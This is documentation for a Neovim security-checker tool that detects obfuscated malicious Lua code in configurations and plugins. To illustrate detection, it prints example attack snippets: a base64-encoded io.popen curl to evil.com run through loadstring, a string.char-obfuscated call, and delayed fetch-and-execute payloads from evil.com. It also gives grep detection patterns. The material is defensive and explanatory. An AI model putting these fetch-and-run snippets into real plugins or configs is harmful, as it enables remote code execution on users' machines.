# Obfuscation Detection Documentation

## Overview

The Neovim Security Checker includes advanced obfuscation detection capabilities to identify potentially malicious code hidden through various encoding and obfuscation techniques commonly used in attacks against Neovim configurations and plugins.

## How It Works

### Detection Layers

The obfuscation detection system works in multiple layers:

1. **Pattern Matching**: Scans for known obfuscation patterns and encoding functions
2. **Content Analysis**: Decodes encoded strings and analyzes their content
3. **Behavioral Analysis**: Detects suspicious combinations of operations
4. **Risk Scoring**: Assigns risk scores based on multiple indicators

### Detection Categories

#### 1. Base64 Encoded Code Detection

**What it detects:**
- Base64 encoded strings longer than a threshold (default: 50 characters)
- Calls to base64 encoding/decoding functions
- Decoded content containing dangerous patterns

**Example malicious pattern:**
```lua
-- Malicious: Base64 encoded shell command
local cmd = "aW8ucG9wZW4oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3BheWxvYWQuc2gnKQ=="
loadstring(vim.fn.base64decode(cmd))()
```

**Legitimate use case:**
```lua
-- Legitimate: Encoding configuration data
local config_data = vim.fn.base64encode(vim.json.encode(settings))
```

#### 2. Encryption and Encoding Patterns

**What it detects:**
- XOR encoding operations (bit.bxor, bit32.bxor)
- Excessive hex-encoded values
- URL-encoded payloads
- Custom encoding schemes

**Example patterns:**
```lua
-- XOR obfuscation
local function decode(s, key)
  local result = {}
  for i = 1, #s do
    table.insert(result, string.char(bit.bxor(string.byte(s, i), key)))
  end
  return table.concat(result)
end

-- Hex encoding
local payload = {0x6c, 0x6f, 0x61, 0x64, 0x73, 0x74, 0x72, 0x69, 0x6e, 0x67}
```

#### 3. Code Obfuscation Techniques

**What it detects:**
- Excessive string.char() usage
- Dynamic code loading (loadstring, load)
- Environment manipulation (getfenv, setfenv)
- Dynamic function name construction
- Raw table manipulation

**Obfuscation example:**
```lua
-- String obfuscation via string.char
local cmd = string.char(105,111,46,112,111,112,101,110)
_G[cmd]("curl http://evil.com")
```

#### 4. Suspicious Behavior Patterns

**What it detects:**
- Network requests combined with encoded data
- File operations with constructed paths
- Dynamic require() with string concatenation
- Process spawning with dynamic arguments

**Example:**
```lua
-- Suspicious: Network request with dynamic code execution
local url = "http://" .. domain .. "/payload.lua"
loadstring(vim.fn.system("curl " .. url))()
```

#### 5. Advanced Threat Detection

**What it detects:**
- Multi-stage payload delivery
- Time-delayed execution
- Anti-debugging techniques
- Environment fingerprinting
- Package/module manipulation

**Examples:**
```lua
-- Multi-stage payload
vim.defer_fn(function()
  local payload = require("http").get("http://evil.com/stage2")
  loadstring(payload)()
end, 5000)

-- Environment fingerprinting
if vim.fn.hostname() == "target" and vim.loop.os_uname().sysname == "Linux" then
  -- Execute malicious code only on specific system
end
```

## Using the Security Checker

### Lua API

```lua
-- Load the security audit module
local audit = require("scripts.security_audit")

-- Audit a single file
local result = audit.audit_file("path/to/plugin.lua")
print(audit.format_results(result))

-- Audit entire directory
local results = audit.audit_directory("~/.config/nvim/lua/plugins")
print(audit.format_results(results))

-- Load custom configuration
audit.load_config("lua/config/security.lua")
```

### Shell Script

```bash
# Run security check on current directory
./scripts/nvim_security_check.sh

# Scan specific directory with custom report file
./scripts/nvim_security_check.sh ~/.config/nvim/lua security_report.txt
```

### Configuration

Edit `lua/config/security.lua` to customize:

```lua
-- Set sensitivity level
M.sensitivity = "high"  -- "low", "medium", or "high"

-- Add to whitelist
M.whitelist = {
  "lazy%-lock%.json",
  "compiled/.*",
  "vendor/.*",
}

-- Trust specific plugins
M.trusted_plugins = {
  "lazy.nvim",
  "plenary.nvim",
}
```

## Understanding Results

### Severity Levels

- **💀 CRITICAL**: Immediate threat - likely malicious code
- **🔴 HIGH**: Highly suspicious patterns requiring immediate review
- **🟡 MEDIUM**: Potentially concerning patterns - investigate further
- **🟢 LOW**: Minor concerns - likely false positives

### Risk Scores

Obfuscation scores are calculated based on:
- Number of obfuscation techniques used
- Presence of dangerous operations
- Combination of suspicious patterns

**Score interpretation:**
- 0-5: Low risk
- 6-15: Medium risk
- 16-25: High risk
- 26+: Critical risk

### Example Output

```
🔴 [HIGH] Obfuscation Detected
  Plugin: suspicious-plugin
  File: lua/suspicious-plugin/init.lua:45
  Issue: Base64 encoded code found
  Encoded: aW8ucG9wZW4oJ2N1cmwgaHR0cDovL2V2aWwuY29tJyk=
  Decoded: io.popen('curl http://evil.com')
  Risk Score: 25
  Recommendation: REMOVE THIS PLUGIN IMMEDIATELY

🟡 [MEDIUM] Code Obfuscation
  File: lua/plugin/helper.lua:120
  Issue: Dynamic code loading detected
  Match: loadstring(data)
  Risk Score: 5
  Recommendation: Review code context
```

## Handling False Positives

### Common False Positives

1. **Legitimate Base64 Usage**
   - Asset embedding (images, fonts)
   - Configuration serialization
   - Authentication tokens
   
2. **Valid Encoding Operations**
   - Data compression
   - Cryptographic operations
   - Protocol implementations

3. **Meta-programming**
   - Code generation tools
   - DSL implementations
   - Template systems

### Whitelisting Safe Code

Add patterns to `lua/config/security.lua`:

```lua
M.whitelist = {
  -- Whitelist specific files
  "lua/utils/base64_utils%.lua",
  
  -- Whitelist entire directories
  "third_party/.*",
  
  -- Whitelist by plugin name
  "nvim%-base64%-.*",
}
```

### Manual Analysis Procedures

1. **Review the context**: Look at surrounding code
2. **Check the author**: Verify plugin source and reputation
3. **Inspect the pattern**: Understand why it was flagged
4. **Decode manually**: Use base64 tools to inspect encoded content
5. **Test in isolation**: Run suspected code in a sandbox
6. **Consult community**: Check GitHub issues or security forums

### Deobfuscation Tools

For manual analysis:

```bash
# Decode base64
echo "aW8ucG9wZW4oJ2N1cmwgaHR0cDovL2V2aWwuY29tJyk=" | base64 -d

# Decode hex
echo -e "\x6c\x6f\x61\x64"

# Pretty-print Lua
lua-format suspicious.lua

# Static analysis
luacheck suspicious.lua
```

### Lua Deobfuscation

```lua
-- Manual base64 decode
local decoded = vim.fn.base64decode(encoded_string)
print(decoded)

-- Inspect hex values
local hex_str = "6c6f6164"
local decoded = ""
for i = 1, #hex_str, 2 do
  decoded = decoded .. string.char(tonumber(hex_str:sub(i, i+1), 16))
end
print(decoded)
```

## Best Practices

### For Plugin Developers

1. **Avoid obfuscation**: Keep code readable and transparent
2. **Document encoding**: Explain why encoding is necessary
3. **Minimize dynamic code**: Reduce loadstring/load usage
4. **Use clear patterns**: Avoid suspicious-looking constructs
5. **Provide checksums**: Help users verify integrity

### For Users

1. **Regular scans**: Run security checks periodically
2. **Review new plugins**: Scan before installing
3. **Keep whitelist updated**: Maintain list of trusted sources
4. **Monitor changes**: Watch for updates to installed plugins
5. **Report suspicious**: Share findings with community

### Security Workflow

```bash
# Before installing a new plugin
./scripts/nvim_security_check.sh ~/.local/share/nvim/lazy/new-plugin

# Regular audit
./scripts/nvim_security_check.sh ~/.config/nvim/lua > weekly_audit.txt

# After plugin updates
git -C ~/.local/share/nvim/lazy/plugin-name log -p -1 | grep -E "(base64|loadstring|popen)"
```

## Advanced Features

### Custom Pattern Detection

Extend detection by adding patterns to `scripts/security_audit.lua`:

```lua
M.patterns.custom = {
  "my_suspicious_pattern",
  "another_red_flag",
}
```

### Integration with CI/CD

```yaml
# .github/workflows/security-check.yml
name: Security Check
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run security audit
        run: ./scripts/nvim_security_check.sh .
```

### Automated Reporting

```lua
-- Auto-report findings
local audit = require("scripts.security_audit")
local results = audit.audit_directory(".")

if #results > 0 then
  -- Send to logging service
  local report = audit.format_results(results)
  vim.fn.system("mail -s 'Security Alert' admin@example.com", report)
end
```

## Limitations

1. **Pattern-based detection**: May miss novel obfuscation techniques
2. **False positives**: Legitimate code might trigger alerts
3. **Performance**: Large codebases may take time to scan
4. **Decode accuracy**: Some encoding schemes might not decode correctly
5. **Context awareness**: Cannot fully understand code intent

## References

- [Lua Security Best Practices](https://www.lua.org/manual/5.4/)
- [Neovim Security Guidelines](https://neovim.io)
- [Common Malware Obfuscation Techniques](https://attack.mitre.org/techniques/T1027/)

## Support

For issues or questions:
- Check existing GitHub issues
- Review this documentation
- Consult Neovim community forums
- Report security concerns responsibly

---

**Last Updated**: 2025-12-05  
**Version**: 1.0.0
